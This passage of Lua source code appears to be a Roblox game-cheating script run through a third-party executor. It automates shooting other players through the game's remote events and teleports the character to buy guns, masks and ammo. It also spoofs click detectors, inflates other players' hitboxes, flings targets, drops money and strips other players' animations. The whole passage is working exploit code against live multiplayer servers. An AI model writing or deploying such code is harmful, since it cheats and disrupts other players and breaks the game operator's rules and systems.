            if target and target.Character and target.Character:FindFirstChild("Head") then
                for _, tool in pairs(LocalPlayer.Character:GetChildren()) do
                    if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                        ReplicatedStorage.MainEvent:FireServer(
                            "ShootGun",
                            tool.Handle,
                            tool.Handle.Position,
                            target.Character.Head.Position,
                            target.Character.Head,
                            Vector3.new(0, 0, 0)
                        )
                    end
                end
            end
        end
    end
end)

local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local humanoid = Character:FindFirstChildOfClass("Humanoid")
local root = Character:FindFirstChild("HumanoidRootPart")

Player.CharacterAdded:Connect(function(char)
    Character = char
    humanoid = char:WaitForChild("Humanoid")
    root = char:WaitForChild("HumanoidRootPart")
end)

function getEquippedGuns()
    local guns = {}
    local char = Player.Character
    if char then
        for _, tool in ipairs(char:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(guns, tool)
            end
        end
    end
    return guns
end

function getAmmoCount(gunName)
    local inventory = Player.DataFolder.Inventory
    local ammo = inventory:FindFirstChild(gunName)
    if ammo then
        return tonumber(ammo.Value)
    end
    return nil
end

function hasGun(toolName)
    local Character = Player.Character
    local Backpack = Player:FindFirstChild("Backpack")
    if Backpack then
        for _, item in ipairs(Backpack:GetChildren()) do
            if item:IsA("Tool") and item.Name == toolName then
                return true
            end
        end
    end
    if Character then
        for _, item in ipairs(Character:GetChildren()) do
            if item:IsA("Tool") and item.Name == toolName then
                return true
            end
        end
    end
    return false
end

function getNextItemToBuy()
    local char = Player.Character
    if not char then return nil end

    for i = 1, #Guns do
        local gunKey = Guns[i]
        local gunInfo = gunData[gunKey]
        if gunInfo and not hasGun(gunInfo.toolName) then
            return "gun"
        end
    end

    if automaskenabled and not (char:FindFirstChild("[Mask]") or char:FindFirstChild("In-gameMask")) then
        return "mask"
    end

    return nil
end

local fired = false

game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
    fired = false
end)

local executor = getexecutorname()

if executor and executor:lower():find("xeno") then
    getgenv().fireclickdetector = function(object, distance, event)
        if not fired then
            fired = true
            game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
        end

        if game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool") then        game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
        end

        if typeof(object) ~= "Instance" then
            return
        end

        local click_detector = object:FindFirstChild("ClickDetector") or object
        local old_cd_parent = click_detector.Parent

        local stub_part = Instance.new("Part")
        stub_part.Transparency = 1
        stub_part.Size = Vector3.new(30, 30, 30)
        stub_part.Anchored = true
        stub_part.CanCollide = false
        stub_part.Parent = workspace

        click_detector.Parent = stub_part
        click_detector.MaxActivationDistance = math.huge

        local connection = game:GetService("RunService").Heartbeat:Connect(function()
            stub_part.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20) * CFrame.new(workspace.Camera.CFrame.LookVector)       game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace:FindFirstChildOfClass("Camera").CFrame)
        end)
        click_detector.MouseClick:Once(function()
            connection:Disconnect()
            click_detector.Parent = old_cd_parent
            stub_part:Destroy()
        end)

        task.delay(3, function()
            connection:Disconnect()
            click_detector.Parent = old_cd_parent
            stub_part:Destroy()
        end)
    end
end

task.spawn(function()
    while true do
        local gunKey = Guns[currentGunIndex]
        local gunInfo = gunData[gunKey]
        if gunInfo and getNextItemToBuy() == "gun" then
            local toolName = gunInfo.toolName
            local shopName = gunInfo.shopName
            local shopPart = workspace.Ignored.Shop:FindFirstChild(shopName)
            local Character = Player.Character or Player.CharacterAdded:Wait()

            if shopPart and Character and root and humanoid and not hasGun(toolName) then
                buyingGunInProgress = true

                local clickDetector = shopPart:FindFirstChild("ClickDetector")

                while not hasGun(toolName) do
                    if root then
                        root.CFrame = CFrame.new(workspace.Ignored.Shop[shopName].Head.CFrame.Position + Vector3.new(0, -8, 0))
                    end
                    fireclickdetector(clickDetector)
                    if not humanoid or humanoid.Health <= 0 then break end
                    task.wait()
                end
                buyingGunInProgress = false
            end
        end
        currentGunIndex += 1
        if currentGunIndex > #Guns then
            currentGunIndex = 1
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        local char = Player.Character
        if char and automaskenabled and getNextItemToBuy() == "mask" then
            pcall(function()
                local humanoid = char:FindFirstChildOfClass("Humanoid")

                if Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]") or char:FindFirstChild("In-gameMask") then buyingMaskInProgress = false return end

                local ShopFolder = workspace:WaitForChild("Ignored"):WaitForChild("Shop")

                local maskItem = ShopFolder:FindFirstChild(
                    (math.random(1, 2) == 1 and "[Skull Mask] - $66" or "[Riot Mask] - $66")
                )
                if not maskItem then return end

                local clickDetector = maskItem:FindFirstChild("ClickDetector")
                if not clickDetector then return end

                buyingMaskInProgress = true

                while automaskenabled and char and not (Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")) do
                    local char = Player.Character
                    local root = char:FindFirstChild("HumanoidRootPart")
                    if root then
                        root.CFrame = CFrame.new(maskItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
                    end
                    fireclickdetector(clickDetector)
                    task.wait()
                    if not automaskenabled or not char or (Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")) then break end
                end

                task.spawn(function()
                    while automaskenabled and char do
                        local char = Player.Character
                        local maskTool = Player.Backpack:FindFirstChild("[Mask]") or char:FindFirstChild("[Mask]")
                        if maskTool then
                            for _, tool in ipairs(char:GetChildren()) do
                                if tool:IsA("Tool") and tool.Name ~= "[Mask]" then
                                    tool.Parent = Player.Backpack
                                end
                            end
                            maskTool.Parent = char
                            maskTool:Activate()
                        end
                        if char:FindFirstChild("In-gameMask") then
                            local equippedMask = char:FindFirstChild("[Mask]")
                            if equippedMask then
                                equippedMask.Parent = Player.Backpack
                            end
                            buyingMaskInProgress = false
                            break
                        end
                        if not automaskenabled or not char then break end
                        task.wait()
                    end
                end)
            end)
        end
        task.wait()
    end
end)

AmmoMap = {
    ["[Rifle]"]      = "5 [Rifle Ammo] - $273",
    ["[AUG]"]        = "90 [AUG Ammo] - $87",
    ["[Flintlock]"]  = "6 [Flintlock Ammo] - $163",
    ["[LMG]"]        = "200 [LMG Ammo] - $328",
    ["[Double-Barrel SG]"] = "18 [Double-Barrel SG Ammo] - $55"
}

task.spawn(function()
    while true do
        local equippedGuns = getEquippedGuns()
        for _, tool in ipairs(equippedGuns) do
            local gunName = tool.Name
            if hasGun(gunName) then
                local ammoCount = getAmmoCount(gunName)
                if ammoCount and ammoCount <= 0 then
                    buyingInProgress = true

                    local ShopFolder = workspace:WaitForChild("Ignored"):WaitForChild("Shop")
                    local ammoItemName = AmmoMap[gunName]
                    local ammoItem = ShopFolder:FindFirstChild(ammoItemName)
                    local Character = Player.Character or Player.CharacterAdded:Wait()

                    if ammoItem and Character and root and humanoid then
                        local clickDetector = ammoItem:FindFirstChild("ClickDetector")
                        local lastAmmo = getAmmoCount(gunName)
                        local purchaseCount = 0

                        while purchaseCount < 6 do
                            if humanoid then
                                humanoid:UnequipTools()
                            end
                            if root then
                                root.CFrame = CFrame.new(ammoItem.Head.CFrame.Position + Vector3.new(0, -8, 0))
                            end
                            fireclickdetector(clickDetector)
                            if not humanoid or humanoid.Health <= 0 then break end
                            task.wait()
                            local newAmmo = getAmmoCount(gunName)
                            if newAmmo and newAmmo > lastAmmo then
                                lastAmmo = newAmmo
                                purchaseCount += 1
                            end
                        end
                    end
                    reloadTool()
                    buyingInProgress = false
                end
            end
        end
        task.wait()
    end
end)

local humanoid = Character:FindFirstChild("Humanoid")
local bodyEffects = Character and Character:FindFirstChild("BodyEffects")
local koValue = bodyEffects and bodyEffects:FindFirstChild("K.O")

local lastDamagerName = ""
getgenv().lastHealths = {}

task.spawn(function()
    while true do
        if Character then
            for _, tool in ipairs(Character:GetChildren()) do
                if tool:IsA("Tool") and tool:FindFirstChild("Ammo") and tool:FindFirstChild("Ammo").Value <= 0 then
                    ReplicatedStorage.MainEvent:FireServer("Reload", tool)
                end
            end
        end
        if not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local Backpack = localPlayer:FindFirstChild("Backpack")
            if Backpack then
                for _, gunKey in ipairs(Guns) do
                    local gunName = gunData[gunKey].toolName
                    local gun = Backpack:FindFirstChild(gunName)
                    if gun and humanoid and humanoid.Health > 0 then
                        if not Character:FindFirstChild(gunName) then
                            gun.Parent = Character
                        end
                    end
                end
            end
        end
        if autodrop then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
        end
        if humanoid and koValue and koValue.Value == true then
            humanoid.Health = 0
        end
        if shouldSwitch and #ragebottargets > 0 then
            local attempts = 0
            while attempts < #ragebottargets do
                currentTargetIndex = (currentTargetIndex % #ragebottargets) + 1
                local candidate = ragebottargets[currentTargetIndex]
                if candidate and candidate.Character then
                    local bodyEffects = candidate.Character:FindFirstChild("BodyEffects")
                    local isDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                    if not isDeath then
                        lockedTarget = candidate
                        shouldSwitch = false
                        break
                    end
                end
                attempts += 1
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while task.wait(0.2) do
        if getgenv().enabled1 and not lockedTarget then
            local playersToCheck = {Owner}
            for pname, _ in pairs(getgenv().sentryprotected) do
                table.insert(playersToCheck, pname)
            end

            for _, pname in ipairs(playersToCheck) do
                local player = Players:FindFirstChild(pname)
                if player and player.Character then
                    local char = player.Character
                    local bodyEffects = char:FindFirstChild("BodyEffects")
                    local lastDamager = bodyEffects and bodyEffects:FindFirstChild("LastDamager")
                    local humanoid = char:FindFirstChildOfClass("Humanoid")

                    if bodyEffects and lastDamager and humanoid then
                        local healthNow = humanoid.Health
                        if getgenv().lastHealths[pname] == nil then
                            getgenv().lastHealths[pname] = healthNow
                        end

                        if healthNow + 0.05 < getgenv().lastHealths[pname] then
                            getgenv().lastHealths[pname] = healthNow
                            task.wait(0.1)

                            local recheck = char:FindFirstChild("BodyEffects"):FindFirstChild("LastDamager")
                            local attackerName = recheck and tostring(recheck.Value)

                            if attackerName ~= "" then
                                local attacker = Players:FindFirstChild(attackerName)
                                if attacker then
                                    sentrytarget = attacker
                                    teleporting = true
                                    voiding = false
                                end
                            end
                        else
                            getgenv().lastHealths[pname] = healthNow
                        end

                        if sentrytarget and sentrytarget.Character then
                            local atkChar = sentrytarget.Character
                            local atkBE = atkChar:FindFirstChild("BodyEffects")
                            local isKO = atkBE and atkBE:FindFirstChild("K.O") and atkBE["K.O"].Value

                            if isKO then
                                sentrytarget = nil
                                teleporting = false
                                voiding = true
                                reloadTool()
                            end
                        end
                    end
                else
                    getgenv().lastHealths[pname] = nil
                end
            end
        end
    end
end)

task.spawn(function()
    while task.wait() do
        if summonTarget and summonTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            
            local lp = Players.LocalPlayer
            if not lp.Character then continue end

            local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
            local thrp = summonTarget.Character:FindFirstChild("HumanoidRootPart")

            if hrp and thrp then
                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero

                local offset
                if summonMode == "middle" then
                    offset = CFrame.new(0, 3, 4)
                elseif summonMode == "right" then
                    offset = CFrame.new(3, 3, 0)
                elseif summonMode == "left" then
                    offset = CFrame.new(-3, 3, 0)
                else
                    offset = CFrame.new(0, 3, 4)
                end

                hrp.CFrame = thrp.CFrame * offset

                hrp.Velocity = Vector3.zero
                hrp.RotVelocity = Vector3.zero
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end
end)

local hitboxsize = 30

local Players = cloneref(game:GetService("Players"))
local Client = Players.LocalPlayer

RunService.RenderStepped:Connect(function ()
    for _, Player in pairs(Players:GetPlayers()) do
        if Player ~= Client then
            local character = Player.Character
            if character then
                local HRP = character:FindFirstChild("HumanoidRootPart")
                if HRP then
                    HRP.Size = Vector3.new(hitboxsize, hitboxsize, hitboxsize)
                    HRP.CanCollide = false
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    if not (flingonly and lockedTarget) then return end

    Player.Character.HumanoidRootPart.Velocity = Vector3.new(99999999, 99999999, 99999999)
    RunService.RenderStepped:Wait()
    Player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
end)

Player.CharacterAdded:Connect(function(newChar)
    Character = newChar
    humanoid = Character:WaitForChild("Humanoid")
    bodyEffects = Character:WaitForChild("BodyEffects")
    koValue = bodyEffects:WaitForChild("K.O")
end)

local Workspace = game:GetService("Workspace")

for _, v in ipairs(Workspace:GetDescendants()) do
    if v:IsA("Seat") then
        v:Destroy()
    end
end

Workspace.DescendantAdded:Connect(function(descendant)
    task.defer(function()
        if descendant:IsA("Seat") then
            descendant:Destroy()
        end
    end)
end)

local antiConnections = {}

function stripAnimations(character)
    if character:GetAttribute("AntiServerLaggerHandled") then return end
    character:SetAttribute("AntiServerLaggerHandled", true)

    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    local animator = humanoid:FindFirstChildOfClass("Animator")
    if animator then
        animator:Destroy()
    end

    local animate = character:FindFirstChild("Animate")
    if animate then
        animate.Disabled = true
    end

    humanoid.AutoRotate = false
end

function onPlayer(player)
    if player == LocalPlayer then return end

    if player.Character then
        stripAnimations(player.Character)
    end

    local charConn = player.CharacterAdded:Connect(stripAnimations)
    table.insert(antiConnections, charConn)
end

function EnableAntiServerLagger()
    for _, player in ipairs(Players:GetPlayers()) do
        onPlayer(player)
    end

    antiConnections.playerAdded = Players.PlayerAdded:Connect(onPlayer)
end

EnableAntiServerLagger()

if BlackScreen then
    pcall(function()
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        local cam = workspace.CurrentCamera

        cam.CameraType = Enum.CameraType.Scriptable
        cam.CFrame = CFrame.new(99999, 99999, 99999)

        player.CharacterAdded:Connect(function()
            task.wait(1)
            cam.CameraType = Enum.CameraType.Scriptable
            cam.CFrame = CFrame.new(99999, 99999, 99999)
        end)

        workspace.Terrain:Clear()

        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Light") then
                obj:Destroy()
            end
            if obj:IsA("BasePart") then
                obj.Transparency = 1
                obj.CastShadow = false
                obj.Material = Enum.Material.SmoothPlastic
                if obj:FindFirstChild("SurfaceAppearance") then
                    obj.SurfaceAppearance:Destroy()
                end
            end
        end

        local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        gui.Name = "FPS_BLACKOUT"
        gui.Parent = game.CoreGui
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        local frame = Instance.new("Frame", gui)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.Position = UDim2.new(-0.5, 0, -0.5, 0)
        frame.Size = UDim2.new(2, 0, 2, 0)
        frame.ZIndex = 9999
    end)
end

setfpscap(FPSCap)

pcall(function()
    settings().Rendering.QualityLevel = "Level01"
    UserSettings():GetService("UserGameSettings").MasterVolume = 0
end)
pcall(function()
    local lasers = workspace:FindFirstChild("MAP") and workspace.MAP:FindFirstChild("Indestructible") and workspace.MAP.Indestructible:FindFirstChild("Lasers")
    if lasers then
        lasers:Destroy()
    end
end)
pcall(function()
    pcall(function()
        for _, descendant in ipairs(workspace:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.Material = Enum.Material.Plastic
                descendant.Color = Color3.fromRGB(0, 0, 0)
                descendant.Reflectance = 0
                descendant.CastShadow = false
            end
        end

        workspace.DescendantAdded:Connect(function(part)
            if part:IsA("BasePart") then
                part.Material = Enum.Material.Plastic
                part.Color = Color3.fromRGB(0, 0, 0)
                part.Reflectance = 0
                part.CastShadow = false
            end
        end)
    end)

    pcall(function()
        local VirtualUser = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
            VirtualUser:CaptureController()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end)
end)
